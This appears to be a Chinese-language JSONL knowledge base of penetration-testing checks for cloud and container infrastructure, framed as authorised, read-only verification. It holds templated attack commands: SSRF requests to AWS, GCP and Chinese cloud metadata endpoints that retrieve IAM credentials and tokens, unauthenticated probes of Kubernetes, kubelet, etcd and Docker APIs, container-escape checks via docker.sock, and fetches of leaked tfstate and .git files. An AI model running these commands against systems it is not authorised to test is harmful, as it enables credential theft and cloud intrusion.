{"title":"AWS IMDS 凭据链验证","description":"通过 SSRF/容器内访问实例元数据，确认角色与临时凭据，并用只读 API 验证权限。","detail":"步骤：1) 访问 169.254.169.254/latest/meta-data/；2) 取 iam/security-credentials/ 角色名与凭据 JSON；3) 用 AWS CLI 只读验证（sts get-caller-identity、s3 ls）；4) 记录权限边界。误报：IMDSv2 强制（需 token）、网络策略阻断。","commands":["curl -sS 'https://{{TARGET}}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'","AWS_ACCESS_KEY_ID={{AK}} AWS_SECRET_ACCESS_KEY={{SK}} AWS_SESSION_TOKEN={{TOKEN}} aws sts get-caller-identity"],"tags":["cloud","aws","ssrf","metadata","credential"],"layer":"weakness","confidence":"observed","source":"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html","products":["aws"],"vuln_classes":["ssrf","credential-leak"],"platforms":["cloud"],"license":"CC0-1.0"}
{"title":"AWS S3 桶配置错误验证","description":"检查公开读/写、列出对象、静态网站托管与 ACL，区分设计公开与误配。","detail":"步骤：1) 从页面/JS/响应头收集 bucket 名；2) GET /?list-type=2 判断可列出；3) 读取对象确认敏感数据；4) 测试 PUT 需谨慎。验证：匿名可列出/读取非公开对象。误报：CDN 公开静态资源、桶策略允许公开读。","commands":["curl -sS 'https://{{BUCKET}}.s3.amazonaws.com/?list-type=2&max-keys=5' -w '\\n%{http_code}\\n'","curl -sS 'https://{{BUCKET}}.s3.amazonaws.com/{{KEY}}' -o /tmp/obj -w '%{http_code} %{size_download}\\n'"],"tags":["cloud","aws","s3","misconfig","storage"],"layer":"weakness","confidence":"observed","source":"https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html","products":["aws","s3"],"vuln_classes":["misconfiguration","storage"],"platforms":["cloud"],"license":"CC0-1.0"}
{"title":"GCP 元数据服务验证","description":"通过 SSRF 访问 metadata.google.internal，确认服务账号 token 与项目信息。","detail":"必须带 Metadata-Flavor: Google；路径 /computeMetadata/v1/instance/service-accounts/default/token、/project/project-id。验证：返回 token/项目 ID。误报：需要 header、网络阻断。","commands":["curl -sS 'https://{{TARGET}}/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'","curl -sS 'https://{{TARGET}}/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'"],"tags":["cloud","gcp","ssrf","metadata"],"layer":"weakness","confidence":"observed","source":"https://cloud.google.com/compute/docs/metadata/overview","products":["gcp"],"vuln_classes":["ssrf","credential-leak"],"platforms":["cloud"],"license":"CC0-1.0"}
{"title":"阿里云/腾讯云元数据验证","description":"确认云主机元数据端点是否可读，提取实例 ID/角色/临时凭据线索。","detail":"阿里云：100.100.100.200/latest/meta-data/；腾讯云：metadata.tencentyun.com/latest/meta-data/。验证：返回实例/角色信息。误报：网络策略、需内网。","commands":["curl -sS 'https://{{TARGET}}/fetch?url=http://100.100.100.200/latest/meta-data/instance-id'","curl -sS 'https://{{TARGET}}/fetch?url=http://metadata.tencentyun.com/latest/meta-data/instance-id'"],"tags":["cloud","aliyun","tencent","ssrf","metadata"],"layer":"weakness","confidence":"observed","source":"https://help.aliyun.com/","products":["aliyun","tencent-cloud"],"vuln_classes":["ssrf","credential-leak"],"platforms":["cloud"],"license":"CC0-1.0"}
{"title":"K8s API Server 匿名/RBAC 探测","description":"确认 API Server 是否匿名可读、ServiceAccount 权限边界与常见敏感资源。","detail":"路径：/version、/api、/apis、/api/v1/namespaces、/api/v1/secrets。验证：匿名返回资源列表或 SA token 可读 secrets/pods/exec。误报：401/403、网络隔离。","commands":["curl -sk 'https://{{TARGET}}:6443/version' -w '\\n%{http_code}\\n'","curl -sk -H 'Authorization: Bearer {{SA_TOKEN}}' 'https://{{TARGET}}:6443/api/v1/namespaces' -w '\\n%{http_code}\\n'","kubectl --server=https://{{TARGET}}:6443 --token={{SA_TOKEN}} --insecure-skip-tls-verify auth can-i --list"],"tags":["cloud","k8s","rbac","api","unauth"],"layer":"weakness","confidence":"observed","source":"https://kubernetes.io/docs/reference/access-authn-authz/rbac/","products":["kubernetes"],"vuln_classes":["unauthorized-access","rbac"],"platforms":["k8s"],"license":"CC0-1.0"}
{"title":"Kubelet 10250 未授权","description":"检查 kubelet API 是否匿名可读/可 exec，作为容器逃逸与凭据收集入口。","detail":"路径：/pods、/runningpods、/exec、/logs、/metrics。验证：匿名返回 Pod 列表或可 exec（用无害 id/echo）。误报：401/403、只读端口 10255。","commands":["curl -sk 'https://{{TARGET}}:10250/pods' -w '\\n%{http_code}\\n'","curl -sk 'https://{{TARGET}}:10255/pods' -w '\\n%{http_code}\\n'"],"tags":["cloud","k8s","kubelet","unauth","container"],"layer":"weakness","confidence":"observed","source":"https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-authentication-authorization/","products":["kubernetes","kubelet"],"vuln_classes":["unauthorized-access","rce"],"platforms":["k8s"],"license":"CC0-1.0"}
{"title":"etcd 2379 未授权读取","description":"确认 etcd 是否匿名可读，提取 K8s 密钥/配置线索，作为高价值证据。","detail":"路径：/v2/keys、/v3/kv/range（需 base64 key）。验证：返回 keys 或 K8s secrets。误报：TLS 客户端认证、网络隔离。","commands":["curl -sk 'https://{{TARGET}}:2379/v2/keys/?recursive=true' -w '\\n%{http_code}\\n'","curl -sk 'https://{{TARGET}}:2379/version' -w '\\n%{http_code}\\n'"],"tags":["cloud","k8s","etcd","unauth","secret"],"layer":"weakness","confidence":"observed","source":"https://etcd.io/docs/","products":["etcd"],"vuln_classes":["unauthorized-access","data-exposure"],"platforms":["k8s"],"license":"CC0-1.0"}
{"title":"Docker API 2375/2376 未授权","description":"检查 Docker daemon 是否暴露，确认可列容器/镜像/执行命令的边界。","detail":"路径：/version、/containers/json、/images/json、/exec。验证：匿名返回容器列表；exec 用无害 id。误报：TLS 认证、只读代理。","commands":["curl -sS 'http://{{TARGET}}:2375/version' -w '\\n%{http_code}\\n'","curl -sS 'http://{{TARGET}}:2375/containers/json?all=1' -w '\\n%{http_code}\\n'"],"tags":["cloud","docker","unauth","container"],"layer":"weakness","confidence":"observed","source":"https://docs.docker.com/engine/security/","products":["docker"],"vuln_classes":["unauthorized-access","container-escape"],"platforms":["container"],"license":"CC0-1.0"}
{"title":"容器逃逸面：privileged/hostPath/docker.sock","description":"在已获得容器内立足点的授权场景，检查高风险挂载与能力，证明逃逸可行性但不破坏宿主。","detail":"检查：capsh --print、mount、/var/run/docker.sock、hostPath、/proc/1/root、/sys/fs/cgroup。验证：能读取宿主文件或通过 docker.sock 列宿主容器。误报：受限 capability、只读挂载。","commands":["capsh --print 2>/dev/null | head -20; mount | grep -E 'docker.sock|hostPath|/proc'","ls -l /var/run/docker.sock 2>/dev/null && curl -sS --unix-socket /var/run/docker.sock http://localhost/version"],"tags":["cloud","container","escape","docker","postex"],"layer":"weakness","confidence":"observed","source":"https://kubernetes.io/docs/concepts/security/","products":["docker","kubernetes"],"vuln_classes":["container-escape","privilege-escalation"],"platforms":["container"],"license":"CC0-1.0"}
{"title":"CI Runner 令牌与缓存泄露","description":"检查 GitLab/GitHub/Jenkins runner 的令牌、缓存与日志是否泄露仓库/云凭据。","detail":"入口：CI 日志、artifacts、缓存、环境变量页面、runner 配置。验证：令牌可读仓库/云资源（只读 API）。误报：掩码变量、短期令牌。","commands":["env | grep -iE 'CI_|GITLAB|GITHUB|AWS_|TOKEN|RUNNER' | sed 's/=.*/=<redacted>/'","curl -sS -H 'PRIVATE-TOKEN: {{TOKEN}}' 'https://{{GITLAB}}/api/v4/projects?membership=true&per_page=5' -w '\\n%{http_code}\\n'"],"tags":["cloud","ci","supply-chain","token","credential"],"layer":"infra","confidence":"observed","source":"https://docs.gitlab.com/ee/ci/","products":["gitlab-runner","github-actions"],"vuln_classes":["ci-cd","credential-leak"],"platforms":["ci"],"license":"CC0-1.0"}
{"title":"Terraform state / 云配置泄露","description":"检查公开仓库/对象存储中的 tfstate、.env、云凭据配置，评估可读资源范围。","detail":"入口：.git、S3 桶、CI artifacts、备份目录、公开仓库。验证：tfstate 含资源/凭据；用只读 API 验证。误报：示例/脱敏 state。","commands":["curl -sS 'https://{{TARGET}}/.git/config' -w '\\n%{http_code}\\n'","curl -sS 'https://{{TARGET}}/terraform.tfstate' -o /tmp/tf.json -w '%{http_code} %{size_download}\\n'; jq -r '.resources[]?.type' /tmp/tf.json 2>/dev/null | sort -u | head"],"tags":["cloud","terraform","leak","supply-chain"],"layer":"infra","confidence":"observed","source":"https://developer.hashicorp.com/terraform/language/state","products":["terraform"],"vuln_classes":["secret-exposure","misconfiguration"],"platforms":["cloud"],"license":"CC0-1.0"}
{"title":"云存储公开列表与敏感对象","description":"枚举 S3/OSS/COS/GCS 公开桶，确认是否可列出对象与读取敏感文件。","detail":"入口：页面资源 URL、JS、响应头、证书 SAN。验证：list-type=2 或 /?prefix= 返回对象列表；读取配置/备份。误报：CDN 公开静态资源。","commands":["curl -sS 'https://{{BUCKET}}.oss-cn-hangzhou.aliyuncs.com/?prefix=&max-keys=5' -w '\\n%{http_code}\\n'","curl -sS 'https://storage.googleapis.com/{{BUCKET}}?maxResults=5' -w '\\n%{http_code}\\n'"],"tags":["cloud","storage","s3","oss","gcs","misconfig"],"layer":"weakness","confidence":"observed","source":"https://cloud.google.com/storage/docs/access-control","products":["aws","gcp","aliyun"],"vuln_classes":["storage","misconfiguration"],"platforms":["cloud"],"license":"CC0-1.0"}
